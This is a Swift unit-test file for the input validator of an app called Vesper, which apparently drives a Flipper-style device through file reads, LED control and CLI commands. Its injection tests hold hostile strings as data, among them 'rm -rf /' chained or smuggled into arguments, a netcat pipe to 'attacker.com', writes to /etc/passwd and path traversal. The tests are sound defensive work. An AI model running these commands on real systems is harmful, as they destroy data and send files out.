// InputValidatorTests.swift
// Vesper - Unit tests for InputValidator

import XCTest
@testable import Vesper

final class InputValidatorTests: XCTestCase {

    // MARK: - API Key Validation

    func testValidApiKey() {
        let key = "sk-or-v1-abcdef1234567890"
        XCTAssertTrue(InputValidator.isValidApiKey(key))
    }

    func testValidApiKeyWithHyphensAndUnderscores() {
        let key = "sk-or-v1-abc_def-1234567890"
        XCTAssertTrue(InputValidator.isValidApiKey(key))
    }

    func testInvalidApiKeyEmpty() {
        XCTAssertFalse(InputValidator.isValidApiKey(""))
    }

    func testInvalidApiKeyTooShort() {
        XCTAssertFalse(InputValidator.isValidApiKey("sk-or-v1-abc"))
    }

    func testInvalidApiKeyWrongPrefix() {
        let key = "sk-ant-v1-abcdef1234567890"
        XCTAssertFalse(InputValidator.isValidApiKey(key))
    }

    func testInvalidApiKeySpecialCharacters() {
        let key = "sk-or-v1-abcdef!@#$567890"
        XCTAssertFalse(InputValidator.isValidApiKey(key))
    }

    func testApiKeyWithWhitespaceIsTrimmed() {
        let key = "  sk-or-v1-abcdef1234567890  "
        XCTAssertTrue(InputValidator.isValidApiKey(key))
    }

    // MARK: - Path Validation

    func testValidExtPath() throws {
        let result = try InputValidator.validatePath("/ext/test.txt")
        XCTAssertEqual(result, "/ext/test.txt")
    }

    func testValidIntPath() throws {
        let result = try InputValidator.validatePath("/int/manifest.txt")
        XCTAssertEqual(result, "/int/manifest.txt")
    }

    func testValidExtSubdirectoryPath() throws {
        let result = try InputValidator.validatePath("/ext/subghz/captured.sub")
        XCTAssertEqual(result, "/ext/subghz/captured.sub")
    }

    func testPathTraversalRejected() {
        XCTAssertThrowsError(try InputValidator.validatePath("/ext/../int/secret")) { error in
            guard let validationError = error as? InputValidationError else {
                XCTFail("Expected InputValidationError")
                return
            }
            if case .pathTraversal = validationError {
                // Expected
            } else {
                XCTFail("Expected pathTraversal error, got \(validationError)")
            }
        }
    }

    func testNullByteRejected() {
        XCTAssertThrowsError(try InputValidator.validatePath("/ext/test\0.txt")) { error in
            guard let validationError = error as? InputValidationError else {
                XCTFail("Expected InputValidationError")
                return
            }
            if case .nullByteDetected = validationError {
                // Expected
            } else {
                XCTFail("Expected nullByteDetected error, got \(validationError)")
            }
        }
    }

    func testInvalidPathPrefixRejected() {
        XCTAssertThrowsError(try InputValidator.validatePath("/tmp/test.txt")) { error in
            guard let validationError = error as? InputValidationError else {
                XCTFail("Expected InputValidationError")
                return
            }
            if case .invalidPath = validationError {
                // Expected
            } else {
                XCTFail("Expected invalidPath error, got \(validationError)")
            }
        }
    }

    func testBareExtRootPathAccepted() throws {
        let result = try InputValidator.validatePath("/ext")
        XCTAssertEqual(result, "/ext")
    }

    func testBareIntRootPathAccepted() throws {
        let result = try InputValidator.validatePath("/int")
        XCTAssertEqual(result, "/int")
    }

    func testPathNormalizesDoubleSlashes() throws {
        let result = try InputValidator.validatePath("/ext//subghz//test.sub")
        XCTAssertEqual(result, "/ext/subghz/test.sub")
    }

    func testPathRemovesTrailingSlash() throws {
        let result = try InputValidator.validatePath("/ext/subghz/")
        XCTAssertEqual(result, "/ext/subghz")
    }

    func testPathWithWhitespaceIsTrimmed() throws {
        let result = try InputValidator.validatePath("  /ext/test.txt  ")
        XCTAssertEqual(result, "/ext/test.txt")
    }

    // MARK: - Content Size Validation

    func testNormalContentAccepted() throws {
        let content = String(repeating: "a", count: 1000)
        XCTAssertNoThrow(try InputValidator.validateContentSize(content))
    }

    func testEmptyContentAccepted() throws {
        XCTAssertNoThrow(try InputValidator.validateContentSize(""))
    }

    func testOversizedContentRejected() {
        // 10 MB + 1 byte
        let content = String(repeating: "x", count: 10 * 1024 * 1024 + 1)
        XCTAssertThrowsError(try InputValidator.validateContentSize(content)) { error in
            guard let validationError = error as? InputValidationError else {
                XCTFail("Expected InputValidationError")
                return
            }
            if case .contentTooLarge(let size) = validationError {
                XCTAssertGreaterThan(size, 10 * 1024 * 1024)
            } else {
                XCTFail("Expected contentTooLarge error, got \(validationError)")
            }
        }
    }

    func testExactlyMaxContentAccepted() throws {
        let content = String(repeating: "a", count: 10 * 1024 * 1024)
        XCTAssertNoThrow(try InputValidator.validateContentSize(content))
    }

    func testOversizedDataRejected() {
        let data = Data(repeating: 0xFF, count: 10 * 1024 * 1024 + 1)
        XCTAssertThrowsError(try InputValidator.validateContentSize(data)) { error in
            guard let validationError = error as? InputValidationError else {
                XCTFail("Expected InputValidationError")
                return
            }
            if case .contentTooLarge = validationError {
                // Expected
            } else {
                XCTFail("Expected contentTooLarge error, got \(validationError)")
            }
        }
    }

    func testNormalDataAccepted() throws {
        let data = Data(repeating: 0x42, count: 1000)
        XCTAssertNoThrow(try InputValidator.validateContentSize(data))
    }

    // MARK: - Injection Detection

    func testDetectsShellCommandSubstitution() {
        XCTAssertTrue(InputValidator.containsInjection("$(rm -rf /)"))
    }

    func testDetectsBacktickInjection() {
        XCTAssertTrue(InputValidator.containsInjection("`whoami`"))
    }

    func testDetectsCommandChaining() {
        XCTAssertTrue(InputValidator.containsInjection("test && rm -rf /"))
    }

    func testDetectsPipeInjection() {
        XCTAssertTrue(InputValidator.containsInjection("cat file | nc attacker.com 4444"))
    }

    func testDetectsRedirect() {
        XCTAssertTrue(InputValidator.containsInjection("echo hack > /etc/passwd"))
    }

    func testDetectsPathTraversalInText() {
        XCTAssertTrue(InputValidator.containsInjection("../../etc/passwd"))
    }

    func testDetectsNewlineInjection() {
        XCTAssertTrue(InputValidator.containsInjection("normal\nrm -rf /"))
    }

    func testDetectsUrlEncodedNull() {
        XCTAssertTrue(InputValidator.containsInjection("test%00exploit"))
    }

    func testCleanTextPasses() {
        XCTAssertFalse(InputValidator.containsInjection("Hello world, this is a normal sentence."))
    }

    func testCleanPathPasses() {
        XCTAssertFalse(InputValidator.containsInjection("subghz_capture_433mhz"))
    }

    func testCleanFilenamePasses() {
        XCTAssertFalse(InputValidator.containsInjection("my_file_2024.sub"))
    }

    // MARK: - Command Sanitization

    func testSanitizeCommandRemovesPathTraversal() {
        let cmd = ExecuteCommand(
            action: .readFile,
            args: CommandArgs(path: "/ext/../int/secret.txt"),
            justification: "test",
            expectedEffect: "test"
        )
        let sanitized = InputValidator.sanitizeCommand(cmd)
        XCTAssertFalse(sanitized.args.path?.contains("..") ?? false)
    }

    func testSanitizeCommandPreservesAction() {
        let cmd = ExecuteCommand(
            action: .readFile,
            args: CommandArgs(path: "/ext/test.txt"),
            justification: "read a file",
            expectedEffect: "get contents"
        )
        let sanitized = InputValidator.sanitizeCommand(cmd)
        XCTAssertEqual(sanitized.action, .readFile)
        XCTAssertEqual(sanitized.justification, "read a file")
        XCTAssertEqual(sanitized.expectedEffect, "get contents")
    }

    func testSanitizeCommandClampsColorValues() {
        let cmd = ExecuteCommand(
            action: .ledControl,
            args: CommandArgs(red: 300, green: -10, blue: 128),
            justification: "test",
            expectedEffect: "test"
        )
        let sanitized = InputValidator.sanitizeCommand(cmd)
        XCTAssertEqual(sanitized.args.red, 255)
        XCTAssertEqual(sanitized.args.green, 0)
        XCTAssertEqual(sanitized.args.blue, 128)
    }

    func testSanitizeCliCommandStripsInjection() {
        let cmd = ExecuteCommand(
            action: .executeCli,
            args: CommandArgs(command: "help && rm -rf /"),
            justification: "test",
            expectedEffect: "test"
        )
        let sanitized = InputValidator.sanitizeCommand(cmd)
        // The && should be removed
        XCTAssertFalse(sanitized.args.command?.contains("&&") ?? false)
    }

    func testSanitizeCommandRemovesNullBytes() {
        let cmd = ExecuteCommand(
            action: .readFile,
            args: CommandArgs(path: "/ext/test\0.txt"),
            justification: "test",
            expectedEffect: "test"
        )
        let sanitized = InputValidator.sanitizeCommand(cmd)
        XCTAssertFalse(sanitized.args.path?.contains("\0") ?? false)
    }

    func testSanitizeCommandNormalizesDoubleSlashes() {
        let cmd = ExecuteCommand(
            action: .readFile,
            args: CommandArgs(path: "/ext//subghz//test.sub"),
            justification: "test",
            expectedEffect: "test"
        )
        let sanitized = InputValidator.sanitizeCommand(cmd)
        XCTAssertFalse(sanitized.args.path?.contains("//") ?? false)
    }
}
